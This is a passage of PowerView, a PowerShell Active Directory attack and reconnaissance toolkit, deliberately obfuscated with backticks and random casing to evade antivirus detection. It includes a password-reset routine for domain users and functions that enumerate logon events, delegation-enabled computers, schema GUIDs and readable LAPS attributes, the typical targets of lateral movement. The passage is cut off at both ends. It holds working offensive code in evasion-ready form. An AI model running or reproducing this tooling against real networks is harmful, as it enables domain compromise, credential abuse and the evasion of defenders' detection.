    if (${P`S`Bou`NDPA`RaMEteRs}['Credential']) { ${C`ON`TeX`TaR`GUmeNts}['Credential'] = ${cR`E`de`NTIAl} }
    ${C`ON`TexT} = gE`T-pRIncI`PAlCon`TexT @ContextArguments

    if (${cON`TeXt}) {
        ${U`sEr} = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(${C`On`TexT}.Context, ${i`DeNTItY})

        if (${US`er}) {
            WriTe-VE`RBO`SE "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                ${t`empC`Red} = nEw-o`B`jEct SYS`TeM.M`An`AG`EMe`NT.aUtoM`A`T`IO`N.PsCrE`D`EntiaL('a', ${a`cCo`UNtpaSSwoRD})
                ${u`SeR}.SetPassword(${TEM`PC`R`eD}.GetNetworkCredential().Password)

                ${n`ULL} = ${u`sEr}.Save()
                WRItE-V`e`R`B`oSe "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                WR`i`Te-`wA`RnInG "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            WRit`e-war`Ni`Ng "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}


function GET-`D`om`A`INus`erEVEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${tr`Ue})]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cO`MPU`T`eRnAme} = ${En`V:coMPu`T`ern`AmE},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${stArTT`i`mE} = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${en`DTiME} = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        ${MAXEve`N`TS} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eD`E`NtIaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        
        ${X`pat`hFI`LtEr} = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        ${evEnt`A`R`GUmEN`Ts} = @{
            'FilterXPath' = ${xp`A`THfILTER}
            'LogName' = 'Security'
            'MaxEvents' = ${MAXE`V`en`TS}
        }
        if (${P`SBouNdPara`MEt`Ers}['Credential']) { ${e`VenT`ArGuM`e`NTS}['Credential'] = ${cr`eDenT`IAL} }
    }

    PROCESS {
        ForEach (${C`oM`PUTER} in ${C`ompU`T`ERName}) {

            ${E`Ve`NTarg`UMe`Nts}['ComputerName'] = ${C`omp`Uter}

            GEt`-`WINEVEnT @EventArguments| FoRe`A`c`H-OBJeCT {
                ${e`VE`Nt} = ${_}
                ${pROP`erTi`Es} = ${ev`ent}.Properties
                Switch (${ev`e`NT}.Id) {
                    
                    4624 {
                        
                        if(-not ${PRoPe`R`Ti`ES}[5].Value.EndsWith('$')) {
                            ${Ou`TPut} = New-`obJ`ecT PSObj`eCt -Property @{
                                ComputerName              = ${C`oMpuTeR}
                                TimeCreated               = ${E`VeNT}.TimeCreated
                                EventId                   = ${E`VENT}.Id
                                SubjectUserSid            = ${PRO`P`e`RTIes}[0].Value.ToString()
                                SubjectUserName           = ${Pr`OP`ERtieS}[1].Value
                                SubjectDomainName         = ${pRo`PErT`i`es}[2].Value
                                SubjectLogonId            = ${pRo`pert`Ies}[3].Value
                                TargetUserSid             = ${Pr`OPe`RTiEs}[4].Value.ToString()
                                TargetUserName            = ${PR`o`pER`Ties}[5].Value
                                TargetDomainName          = ${PrOp`ert`I`Es}[6].Value
                                TargetLogonId             = ${P`RO`p`ERTiES}[7].Value
                                LogonType                 = ${proP`ER`TIeS}[8].Value
                                LogonProcessName          = ${pr`O`PerT`IEs}[9].Value
                                AuthenticationPackageName = ${PRo`pEr`TI`Es}[10].Value
                                WorkstationName           = ${pROPe`R`TIES}[11].Value
                                LogonGuid                 = ${P`Ro`pErtI`eS}[12].Value
                                TransmittedServices       = ${p`R`oP`eRtieS}[13].Value
                                LmPackageName             = ${p`RO`P`erTIES}[14].Value
                                KeyLength                 = ${PrOPERT`I`eS}[15].Value
                                ProcessId                 = ${PRO`PE`Rti`eS}[16].Value
                                ProcessName               = ${Pr`Ope`R`TiEs}[17].Value
                                IpAddress                 = ${pROP`ErTI`ES}[18].Value
                                IpPort                    = ${pRO`P`ErtI`ES}[19].Value
                                ImpersonationLevel        = ${Pr`oP`eR`TiES}[20].Value
                                RestrictedAdminMode       = ${p`RopeRTi`es}[21].Value
                                TargetOutboundUserName    = ${pRop`eR`TIeS}[22].Value
                                TargetOutboundDomainName  = ${pr`oPE`Rt`iES}[23].Value
                                VirtualAccount            = ${pr`ope`RtIEs}[24].Value
                                TargetLinkedLogonId       = ${pr`oPe`Rt`IES}[25].Value
                                ElevatedToken             = ${p`R`O`pErTIeS}[26].Value
                            }
                            ${O`U`TPuT}.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            ${ou`T`Put}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${pr`operT`I`eS}[5].Value.EndsWith('$')) -and (${Pr`OP`ER`TieS}[11].Value -match 'taskhost\.exe')) {
                            ${oU`TP`UT} = ne`W-O`B`jecT pSOb`ject -Property @{
                                ComputerName              = ${c`oMpuTer}
                                TimeCreated       = ${e`VE`Nt}.TimeCreated
                                EventId           = ${Eve`Nt}.Id
                                SubjectUserSid    = ${pRO`P`eRT`IEs}[0].Value.ToString()
                                SubjectUserName   = ${PRopE`RT`IeS}[1].Value
                                SubjectDomainName = ${pr`oP`ErTieS}[2].Value
                                SubjectLogonId    = ${P`R`oPerTiEs}[3].Value
                                LogonGuid         = ${pr`OP`eRTIEs}[4].Value.ToString()
                                TargetUserName    = ${pr`O`PErTIEs}[5].Value
                                TargetDomainName  = ${P`ROPErt`IES}[6].Value
                                TargetLogonGuid   = ${PR`OPeRt`iEs}[7].Value
                                TargetServerName  = ${P`Ro`PERtiEs}[8].Value
                                TargetInfo        = ${Pr`ope`R`TIes}[9].Value
                                ProcessId         = ${P`RoP`ER`TiES}[10].Value
                                ProcessName       = ${PRo`peR`TIES}[11].Value
                                IpAddress         = ${P`R`oPEr`TIeS}[12].Value
                                IpPort            = ${p`RopErT`iEs}[13].Value
                            }
                            ${O`UtpuT}.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            ${OuT`put}
                        }
                    }
                    default {
                        WrITe-`w`ARNINg "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function GE`T-`d`omainGUIDmap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mAiN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`ErVeR},

        [ValidateRange(1, 10000)]
        [Int]
        ${REsu`LTP`Ag`eSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVERT`I`MelI`m`It},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`dENTIal} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`SL},

        [Switch]
        ${ObFU`Sc`ATE}
    )

    ${gu`i`ds} = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    ${fOREstArg`UM`ents} = @{}
    if (${psB`oundpAram`E`TErS}['Credential']) { ${For`E`StAr`gumEnTS}['Credential'] = ${c`R`eDenT`ial} }
    ${D`OmA`InDnaRGuM`ents} = @{}
    if (${pSbOu`NDpA`RAME`T`ERs}['Domain']) { ${DOMAI`NdN`Ar`guMENTs}['Domain'] = ${do`MaiN} }
    if (${Ps`BOuNdp`ARAm`E`TeRS}['Server']) { ${dOmA`InDN`ARGU`MEnts}['Server'] = ${S`erv`Er} }
    if (${psb`o`UnD`parAm`etERS}['Credential']) { ${D`omAind`Na`RG`UMeNTs}['Credential'] = ${CR`ede`NtIAL} }
    if (${PSBO`UN`dp`ARameTERS}['SSL']) { ${D`omai`ND`NaRg`UmE`Nts}['SSL'] = ${s`Sl} }


    try {
        ${S`ch`EMapAth} = (get-`F`OrEST @ForestArguments).schema.name
    }
    catch {
        ${dO`mAIN`dN} = Get-d`oMa`I`NDn @DomainDNArguments
        if (${d`oMA`iNdn}) {
            ${S`C`hEmAPA`TH} = "CN=Schema,CN=Configuration,$($DomainDN)"
        }
    }
    if (-not ${sCH`eM`A`paTh}) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    ${seaRCH`eRaRG`UM`e`NtS} = @{
        'SearchBase' = ${s`ch`EmAPATH}
    }
    if (${psBO`UN`DPA`R`A`meTErs}['Domain']) { ${SEarcHe`RAr`GUME`NTS}['Domain'] = ${d`OMAiN} }
    if (${PsbounDp`ARA`M`eTeRs}['Server']) { ${SearC`hE`RArg`U`MentS}['Server'] = ${seR`V`ER} }
    if (${pSb`oUNd`pa`RAM`ET`ERs}['ResultPageSize']) { ${seARCH`ERa`RG`UMENts}['ResultPageSize'] = ${RESul`TPaGEs`i`zE} }
    if (${pSboUnDPa`RA`mEt`ErS}['ServerTimeLimit']) { ${Sea`R`chERARGUM`EN`TS}['ServerTimeLimit'] = ${SE`RvERTImE`li`MIt} }
    if (${psb`OundP`ARA`M`EtErs}['Credential']) { ${SE`ArcHeRa`R`gUmentS}['Credential'] = ${crEdEN`T`I`Al} }
    if (${psbOunDpARam`e`Te`Rs}['SSL']) { ${sEAR`cHerAR`gUM`EN`TS}['SSL'] = ${s`Sl} }

    ${ld`ApFiL`T`ER} = '(schemaIDGUID=*)'
    try {
        ${rE`SU`lTs} = InvO`Ke`-ldA`PquERY @SearcherArguments -LDAPFilter "$LDAPFilter"
        ${R`eS`ULTS} | whER`E-`OB`jeCT {${_}} | fOReA`Ch`-objE`CT {
            if (g`Et`-membER -inputobject ${_} -name "Attributes" -Membertype P`Rop`ERtIes) {
                ${Pr`op} = @{}
                foreach (${A} in ${_}.Attributes.Keys | sO`RT-`ObJECt) {
                    if ((${a} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${A} -eq 'objectguid') -or (${a} -eq 'usercertificate') -or ${A} -eq 'schemaidguid') {
                        ${p`ROp}[${A}] = ${_}.Attributes[${a}]
                    }
                    else {
                        ${v`A`LUeS} = @()
                        foreach (${v} in ${_}.Attributes[${A}].GetValues([byte[]])) {
                            ${vALU`Es} += [System.Text.Encoding]::UTF8.GetString(${v})
                        }
                        ${p`ROP}[${a}] = ${v`Al`UEs}
                    }
                }
            }
            else {
                ${pr`op} = ${_}.Properties
            }

            ${gUi`Ds}[(N`eW-O`BJEct GU`Id (,${Pr`OP}.schemaidguid[0])).Guid] = ${pR`Op}.name[0]
        }
        if (${r`e`suLts}) {
            try { ${reSU`L`TS}.dispose() }
            catch {
                w`RI`TE-VERbOSe "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
            }
        }
    }
    catch {
        Wr`iTE`-`VERboSe "[Get-DomainGUIDMap] Error in building GUID map: $_"
    }

    ${sE`Arc`HeRARgu`M`E`NTs}['SearchBase'] = ${sc`HEma`paTH}.replace('Schema','Extended-Rights')
    ${Lda`Pf`ilTeR} = '(objectClass=controlAccessRight)'

    try {
        ${res`UL`TS} = invOK`E`-Ld`ApQueRy @SearcherArguments -LDAPFilter "$LDAPFilter"
        ${r`eSUl`TS} | wh`e`RE-ob`jeCT {${_}} | FOreACh-o`B`jeCt {
            if (GEt-`m`eMbER -inputobject ${_} -name "Attributes" -Membertype pr`O`PErTIES) {
                ${pr`op} = @{}
                foreach (${A} in ${_}.Attributes.Keys | S`oRt-OB`jecT) {
                    if ((${A} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${A} -eq 'objectguid') -or (${A} -eq 'usercertificate')) {
                        ${pr`Op}[${a}] = ${_}.Attributes[${a}]
                    }
                    else {
                        ${vAL`UEs} = @()
                        foreach (${v} in ${_}.Attributes[${A}].GetValues([byte[]])) {
                            ${VA`l`Ues} += [System.Text.Encoding]::UTF8.GetString(${v})
                        }
                        ${pr`op}[${a}] = ${VAl`UeS}
                    }
                }
            }
            else {
                ${p`ROp} = ${_}.Properties
            }

            ${GU`IDs}[${P`RoP}.rightsguid[0].toString()] = ${pR`op}.name[0]
        }
        if (${Re`S`ULtS}) {
            try { ${reS`U`LTS}.dispose() }
            catch {
                w`R`ITE-VeRBO`SE "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
            }
        }
    }
    catch {
        wriT`E-v`erBosE "[Get-DomainGUIDMap] Error in building GUID map: $_"
    }

    ${Gu`I`DS}
}


function gEt-do`mA`iNCoMPU`TER {


    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${IdEnt`i`TY},

        [Switch]
        ${U`NcOn`StraIned},

        [Switch]
        ${tRu`StE`dT`oau`TH},

        [Switch]
        ${R`BcD},

        [Switch]
        ${PR`INTe`RS},

        [Switch]
        ${EXclUdE`d`CS},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        ${s`PN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${op`E`RaTinGsY`STEM},

        [ValidateNotNullOrEmpty()]
        [String]
        ${s`erV`ICepA`Ck},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Si`TenamE},

        [Switch]
        ${PI`Ng},

        [ValidateRange(1, 10000)]
        [Int]
        ${La`s`T`lOgON},

        [Switch]
        ${Hasl`A`PS},

        [Switch]
        ${Nol`APs},

        [Switch]
        ${C`ANREA`d`LaPS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`ma`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LdAPfi`lT`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prope`RTi`ES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${Sea`R`ChbA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ERV`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`eAR`ch`sCopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SulT`PA`Ge`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${ser`V`er`TIMe`LIm`IT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${Sec`UrI`T`YMasKs},

        [Switch]
        ${tOmbS`To`NE},

        [Alias('ReturnOne')]
        [Switch]
        ${FI`NdONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`de`NtIaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw},

        [Switch]
        ${s`sL},

        [Switch]
        ${Ob`Fu`sCATE}
    )

    DynamicParam {
        ${uaCVA`LU`eN`A`mES} = [Enum]::GetNames(${Uac`enUm})
        
        ${ua`cVALueN`A`MeS} = ${uAc`Va`Luen`AmeS} | FO`Re`Ac`h-ob`JEct {${_}; "NOT_$_"}
        
        neW`-DYnAm`ICPA`R`AM`eTER -Name u`Ac`Fi`LTeR -ValidateSet ${U`AC`V`AlUe`NAmEs} -Type ([array])
    }

    BEGIN {
        ${s`e`Arc`hErArgUmE`N`TS} = @{}
        if (${PSbo`UNd`pArAMet`erS}['Domain']) { ${sE`ARch`eR`ArGuMen`TS}['Domain'] = ${Do`Main} }
        if (${p`sB`O`UnDpArA`mETERs}['Properties']) { ${sE`ArCHE`RArguMEn`Ts}['Properties'] = ${pRo`P`eRTI`eS} }
        if (${pS`B`oUn`Dp`A`RAmEtERs}['SearchBase']) { ${seA`Rche`Ra`RGuMenTS}['SearchBase'] = ${S`E`ARchbaSE} }
        if (${P`SB`OUN`DPAr`AmEtERs}['Server']) { ${s`Ea`RchERAr`GUME`NTS}['Server'] = ${Se`R`VeR} }
        if (${P`sboUnDPA`R`AmE`Te`RS}['SearchScope']) { ${Se`ARc`H`eR`A`RGUmEnTS}['SearchScope'] = ${seaRC`HSc`o`pE} }
        if (${psbOUnD`P`ARAm`eTeRs}['ResultPageSize']) { ${S`earcHE`RaRgUmen`TS}['ResultPageSize'] = ${rEsu`ltpag`e`SiZE} }
        if (${P`s`BOUN`DPARA`mEt`erS}['ServerTimeLimit']) { ${Se`A`RCHE`RARGuM`en`TS}['ServerTimeLimit'] = ${SeR`VER`TiMeL`IMIt} }
        if (${P`SbOU`NDpa`RaMEtE`Rs}['SecurityMasks']) { ${S`Ea`RcherargUM`ENTs}['SecurityMasks'] = ${SE`cURi`Ty`MaS`kS} }
        if (${PSbou`N`dP`ArA`MEtE`RS}['Tombstone']) { ${sEarcH`e`R`A`Rgu`ments}['Tombstone'] = ${t`O`mbstoNE} }
        if (${pSboU`NdPAR`A`me`TErs}['Credential']) { ${s`eaRChE`RaRGUM`ENTs}['Credential'] = ${C`REDeN`TiaL} }
        if (${psBoUN`DpARaMe`TE`Rs}['SSL']) { ${Se`ArCHeraRgU`MEn`TS}['SSL'] = ${s`SL} }
        if (${pSbo`U`NDPARA`MeTE`Rs}['Obfuscate']) {${SEARC`HER`A`Rg`UMentS}['Obfuscate'] = ${ObFu`s`cA`TE} }
        if (${Psb`ounDpArAm`ET`e`RS}['FindOne']) { ${sEARch`E`R`ARg`UMenTs}['FindOne'] = ${fin`d`onE} }

        ${dN`S`E`AR`CHERArG`UmENTs} = @{}
        if (${P`sbo`UND`PARaM`et`ers}['Domain']) { ${dNSE`ArchErA`RGuMe`NTs}['Domain'] = ${dO`ma`IN} }
        if (${PSB`ou`Nd`paRAmetErs}['Server']) { ${DnsEA`Rche`RAR`gumENts}['Server'] = ${s`ErV`er} }
        if (${p`Sbou`N`dPaRametERS}['SSL']) { ${D`N`SeaRCherArgUMen`TS}['SSL'] = ${S`sL} }
        if (${ps`BoUND`pAraM`eTe`RS}['Obfuscate']) {${dN`SearchE`R`ARGumEnTS}['Obfuscate'] = ${oB`Fus`cATE} }

    }

    PROCESS {
        
        if (${PsBO`UN`DpaRaM`EterS} -and (${psBO`U`NDPar`AMeT`ErS}.Count -ne 0)) {
            N`EW-`D`ynamiCPar`A`mE`TEr -CreateVariables -BoundParameters ${pSb`oUNDpArA`M`ete`Rs}
        }

        ${i`DeNTit`Y`FILTer} = ''
        ${FILt`er} = ''
        ${iD`ENTi`TY} | W`He`Re`-OBJecT {${_}} | FOR`EacH-`Ob`jeCT {
            ${Ide`NTI`TYi`NsTaN`CE} = ${_}.Replace('(', '\28').Replace(')', '\29')
            if (${IDE`NtiTyin`stAn`CE} -match '^S-1-') {
                ${id`ENTi`T`YFilter} += "(objectsid=$IdentityInstance)"
            }
            elseif (${i`dEntitY`i`NSTanCe} -match '^CN=') {
                ${IDeNt`It`y`FIl`Ter} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${p`sbO`Un`Dp`ARAMEtErs}['Domain']) -and (-not ${ps`BOu`NDPaR`Ame`Te`Rs}['SearchBase'])) {
                    
                    
                    ${Iden`TI`T`YdOMA`IN} = ${i`D`ENTI`Ty`INstaNCE}.SubString(${IDe`NT`ItyI`NSTaNce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    wr`iT`E-verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                    ${searCh`er`Argu`MeN`Ts}['Domain'] = ${iden`Ti`TYd`O`MaIN}
                    ${C`oM`pSeARch`Er} = gE`T-dom`AINSeA`RcHER @SearcherArguments
                    if (-not ${cO`M`psE`Ar`CHer}) {
                        WRITE`-waR`Ni`NG "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                    }
                }
            }
            elseif (${ide`Nti`TYI`NSTance}.Contains('.')) {
                ${id`eNtityFiL`TEr} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
            }
            elseif (${IdENtiTy`INS`TAN`cE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${g`U`IdbytesTrI`Ng} = (([Guid]${IdE`NtITyINs`T`A`NcE}).ToByteArray() | FOReAC`H-`OB`JE`CT { '\' + ${_}.ToString('X2') }) -join ''
                ${IDEnT`IT`yF`iLTER} += "(objectguid=$GuidByteString)"
            }
            else {
                ${idEn`TIT`yF`iLTeR} += "(name=$IdentityInstance)"
            }
        }
        if (${iDEnT`it`YfI`lTeR} -and (${i`DE`Nti`TyF`ilteR}.Trim() -ne '') ) {
            ${fil`T`eR} += "(|$IdentityFilter)"
        }

        if (${PsBOU`NdPa`RAm`ETERS}['Unconstrained']) {
            wriT`E-vERB`OSe '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
            ${fil`T`ER} += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
        }
        if (${pSBo`Undpa`Ra`m`eteRs}['TrustedToAuth']) {
            wriTE-`V`e`R`BOSe '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
            ${FIl`TER} += '(msds-allowedtodelegateto=*)'
        }
        if (${P`S`BOUndp`AraMeters}['RBCD']) {
            WrItE-V`E`Rb`ose '[Get-DomainComputer] Searching for computers that are configured to allow resource-based constrained delegation'
            ${f`ILTer} += '(msds-allowedtoactonbehalfofotheridentity=*)'
        }
        if (${PsbOu`NDpA`Ra`m`eteRs}['Printers']) {
            WRiT`E-V`er`BoSe '[Get-DomainComputer] Searching for printers'
            ${FI`l`Ter} += '(objectCategory=printQueue)'
        }
        if (${p`sbOU`N`DpaRA`mETE`Rs}['ExcludeDCs']) {
            Wr`iTe-veRB`O`se '[Get-DomainComputer] Excluding domain controllers'
            ${FI`lteR} += '(!(userAccountControl:1.2.840.113556.1.4.803:=8192))'
        }
        if (${Ps`BoUndPara`m`Et`erS}['SPN']) {
            WR`ITE-`VerbosE "[Get-DomainComputer] Searching for computers with SPN: $SPN"
            ${Fi`ltEr} += "(servicePrincipalName=$SPN)"
        }
        if (${PsbOUN`dpARA`m`E`TeRs}['OperatingSystem']) {
            Wr`ITe-V`E`RbO`se "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
            ${Fi`Lt`ER} += "(operatingsystem=$OperatingSystem)"
        }
        if (${Ps`B`O`UNd`PARaMEt`Ers}['ServicePack']) {
            W`RI`T`E-ver`BOSe "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
            ${f`i`ltER} += "(operatingsystemservicepack=$ServicePack)"
        }
        if (${psBou`N`dPA`RAm`etE`RS}['SiteName']) {
            wR`i`Te-`Verb`OsE "[Get-DomainComputer] Searching for computers with site name: $SiteName"
            ${FIlT`Er} += "(serverreferencebl=$SiteName)"
        }
        if (${pSBO`Und`par`AmETerS}['LastLogon']) {
            W`RI`TE-Ve`R`BOSe "[Get-DomainComputer] Searching for computer accounts that have logged on within the last $PSBoundParameters['LastLogon'] days"
            ${l`oGO`Ndate} = (g`ET-`DAte).AddDays(-${ps`BO`UndpAr`AmeT`Ers}['LastLogon']).ToFileTime()
            ${FIl`T`Er} += "(lastlogon>=$LogonDate)"
        }
        if ((${psboU`ND`Par`AMEt`ers}['HasLAPS']) -or (${ps`BO`UnDpAraM`E`TERs}['NoLAPS']) -or (${PSboUn`d`PaRA`m`EteRS}['CanReadLAPS'])) {
            ${SCH`E`m`ADn} = "CN=Schema,CN=Configuration,$(Get-DomainDN @DNSearcherArguments)"
            ${a`T`TRFiLT`er} = ''
            w`R`iTE-`VErBosE "[Get-DomainComputer] Using distinguished name: $SchemaDN"
            if (${pSbOUNDP`ARAMe`T`ers}['HasLAPS']) {
                
                
                get-Do`mAi`N`O`BJect -SearchBase ${Sch`E`MADn} -LDAPFilter "(name=ms-*-admpwd*)" -Properties 'name' @SearcherArguments | seLE`cT -expand NA`ME | Fo`Re`A`ch-oBJect {
                    write-`VE`RBo`SE "[Get-DomainComputer] Searching for attribute: $_"
                    ${a`TTR`F`iLteR} += "($_=*)"
                }
                if (${aTtRf`i`LTER}) { ${fil`T`Er} += "(|$AttrFilter)" }
            }
            if (${pSbOunDpA`Ra`mE`T`E`RS}['NoLAPS']) {
                
                
                Get-D`OMA`INobJ`Ect -SearchBase ${SCHE`m`ADN} -LDAPFilter "(name=ms-*-admpwd*)" -Properties 'name' @SearcherArguments | s`ElE`Ct -expand n`AME | f`OrEA`ch-oB`je`cT {
                    WR`It`e-`VerbOse "[Get-DomainComputer] Searching for attribute: $_"
                    ${a`TtrFiL`TEr} += "(!($_=*))"
                }
                if (${aTtRFi`L`TeR}) { ${F`IltER} += "(&$AttrFilter)" }
            }
            if (${ps`BoU`N`D`ParaMETeRS}['CanReadLAPS']) {
                
                
                G`E`T`-DoMAInobj`ECt -SearchBase ${scH`eM`ADn} -LDAPFilter "(name=ms-*-admpwd)" -Properties 'name' @SearcherArguments | sElE`cT -expand Na`ME | for`eac`H-`o`BJect {
                    wRI`T`E`-vEr`BoSE "[Get-DomainComputer] Searching for attribute: $_"
                    ${aTT`RFI`Lter} += "($_=*)"
                }
                if (${A`TTRfi`L`Ter}) { ${fI`Lt`Er} += "(|$AttrFilter)" }
            }
        }
        if (${P`SBo`UNdP`ARAme`TerS}['LDAPFilter']) {
            wRit`e-VE`RBOse "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
            ${f`ilt`ER} += "$LDAPFilter"
        }
        
        ${U`AcFIl`Ter} | w`Her`e-o`BjECT {${_}} | fo`REach-O`BjE`cT {
            if (${_} -match 'NOT_.*') {
                ${u`A`CFiELd} = ${_}.Substring(4)
                ${ua`c`ValUe} = [Int](${UaC`e`NUm}::${ua`cFI`elD})
                ${F`I`LTER} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
            }
            else {
                ${Ua`CV`ALuE} = [Int](${U`AC`EnuM}::${_})
                ${fi`LT`Er} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
            }
        }



        ${Resu`l`TS} = inVoKE-Ld`A`PQu`Ery @SearcherArguments -LDAPFilter "(&(samAccountType=805306369)$Filter)"
        ${res`UlTS} | WH`Er`e-obJE`ct {${_}} | FoR`eAc`h-OB`J`Ect {
            if (G`ET-`M`EMBeR -inputobject ${_} -name "Attributes" -Membertype PrOP`eR`Ti`Es) {
                ${Pr`OP} = @{}
                foreach (${A} in ${_}.Attributes.Keys | SO`R`T-OBjECT) {
                    if ((${a} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${a} -eq 'objectguid') -or (${a} -eq 'usercertificate')) {
                        ${pR`op}[${a}] = ${_}.Attributes[${A}]
                    }
                    else {
                        ${vA`L`UeS} = @()
                        foreach (${v} in ${_}.Attributes[${a}].GetValues([byte[]])) {
                            ${V`AlUeS} += [System.Text.Encoding]::UTF8.GetString(${v})
                        }
                        ${Pr`oP}[${A}] = ${VA`lUES}
                    }
                }
            }
            else {
                ${PR`oP} = ${_}.Properties
            }

            ${uP} = ${TR`Ue}
            if (${psboU`Ndp`Ar`AMeTErS}['Ping']) {
                ${up} = tesT`-CONN`eCtIon -Count 1 -Quiet -ComputerName ${Pr`oP}.dnshostname
            }
            if (${UP}) {
                if (${PsbO`UND`pARa`MeT`Ers}['Raw']) {
                    
                    ${c`oMputer} = ${_}
                    ${co`mP`UTer}.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                }
                else {
                    ${CoMp`UT`Er} = coNV`E`RT-LD`APPropertY -Properties ${p`ROp}
                    ${cO`M`putEr}.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                }
                ${C`Omp`UTer}
            }
        }
        if (${RESUl`Ts}) {
            try { ${Re`suLTS}.dispose() }
            catch {
                WrI`Te-veRB`o`sE "[Get-DomainComputer] Error disposing of the Results object: $_"
            }
        }
    }
}


function get`-DOmAi`N`OBJecT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
